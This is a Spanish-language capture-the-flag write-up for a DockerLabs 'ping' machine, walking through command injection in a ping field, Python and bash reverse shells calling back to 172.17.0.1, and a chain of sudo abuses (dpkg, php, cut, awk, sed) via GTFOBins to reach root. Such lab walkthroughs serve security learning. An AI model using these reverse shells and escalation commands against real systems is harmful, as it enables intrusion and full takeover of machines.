## **Explotación**

Intentando escapar del `ping`, y ejecutar el comando `whoami` con el **ampersand** "`&`", observo que se ejecuta y me saca el output del comando.

![picture](/assets/images/dockerlabs/pingp7.png)

A continuación, la idea es ejecutar una **Reverse Shell** para obtener una terminal interactiva en el servidor desde mi máquina local.

Para ello inicio un **Listener** con `netcat` por el puerto por el que quiero recibir la **shell**.

- Listener

    ```bash
	nc -lnvp 4444
	```

- Reverse Shell
	
	```python
	python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("172.17.0.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
	```

 
 Introduzco el código en **python3** que me mandará la **Reverse Shell** y lanzo el `ping`.

 ![picture](/assets/images/dockerlabs/pingp8.png)

E instantáneamente tengo una **shell** interactiva en mi terminal.

![picture](/assets/images/dockerlabs/pingp9.png)

Listo el archivo `/etc/passwd` para ver los usuarios del sistema que tienen asignada una **shell** del tipo `bash`, veo que hay 5 más los usuarios **ubuntu** y **root**.

![picture](/assets/images/dockerlabs/pingp10.png)

## **Escalada de privilegios**

#### **Movimientos laterales**

Listando los permisos de `sudo` del usuario **freddy**, veo que puedo ejecutar el binario `dpkg` como el usuario **bobby**.

En la página [GTFOBins - dpkg](https://gtfobins.github.io/gtfobins/dpkg/) nos indican como obtener una **shell** con los permisos de `sudo` en el binario.

En este caso, como los permisos de ``sudo`` son como el usuario **bobby**, tendré que indicarlo antes de ejecutar el comando.

```bash
sudo -u bobby /usr/bin/dpkg -l
!/bin/bash
```

![picture](/assets/images/dockerlabs/pingp11.png)

Una vez siendo **bobby**, listando los permisos de `sudo` del usuario, compruebo que tengo permisos para ejecutar el binario `php` como el usuario **gladys**.

![picture](/assets/images/dockerlabs/pingp12.png)

En la web [GTFOBins - php](https://gtfobins.github.io/gtfobins/php/), podemos encontrar como utilizar el binario `php` con permisos de `sudo`.

```bash
CMD="/bin/bash -c \'bash -i >& /dev/tcp/172.17.0.1/4455 0>&1\'"
```

Abrimos un listener con `netcat` en otra terminal.

```bash
nc -lnvp 4455
```

Y ejecutamos el contenido de **CMD**.

```bash
sudo -u gladys php -r "system('$CMD');"
```

Y obtengo una **shell** con el usuario **gladys**.

Realizo un tratamiento de la **TTY** para trabajar con una terminal más limpia.

```bash
script /dev/null -c bash
Ctrl + Z
export TERM=xterm
export SHELL=/bin/bash
stty rows 48 columns 188
reset
```

![picture](/assets/images/dockerlabs/pingp13.png)

Volviendo a listar los permisos de sudo del usuario **gladys**, puedo ejecutar el binario `cut` como usuario **chocolatito**.

![picture](/assets/images/dockerlabs/pingp14.png)

Con este binario, no podemos escalar privilegios, pero podemos ver el contenido de algún archivo cuyo propietario sea el usuario **chocolatito**. [GTFOBins - cut](https://gtfobins.github.io/gtfobins/cut/).

Realizando una búsqueda de archivos desde la raíz cuyo propietario sea el usuario **chocolatito**, encuentro el archivo `chocolatitocontraseña.txt` en el directorio `/opt`.

```bash
find / -user chocolatito -type f 2>/dev/null
```

![picture](/assets/images/dockerlabs/pingp15.png)

A continuación, intento leer el contenido del archivo siguiendo los pasos de la web.

```bash
LFILE=/opt/chocolatitocontraseña.txt
sudo -u chocolatito /usr/bin/cut "" -f1 "$LFILE"
```

![picture](/assets/images/dockerlabs/pingp16.png)

Y accedo como el usuario **chocolatito**.

![picture](/assets/images/dockerlabs/pingp17.png)

Listando los permisos de `sudo` del usuario, veo que puede ejecutar el binario `awk` como el usuario **theboss**.

Vamos a la web [GTFOBins - awk](https://gtfobins.github.io/gtfobins/awk/).

Y ejecuto lo que indica.

```bash
sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

![picture](/assets/images/dockerlabs/pingp18.png)

#### **Escalada de privilegios a Root**

Y para escalar máximos privilegios, listo los permisos de `sudo` del usuario **theboss**, y puede ejecutar el binario `sed` como usuario **root**.

![picture](/assets/images/dockerlabs/pingp19.png)

[GTFOBins - sed](https://gtfobins.github.io/gtfobins/sed/)

Y cuando lo ejecuto, accedo al sistema como el usuario **root**.

```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

![picture](/assets/images/dockerlabs/pingp20.png)
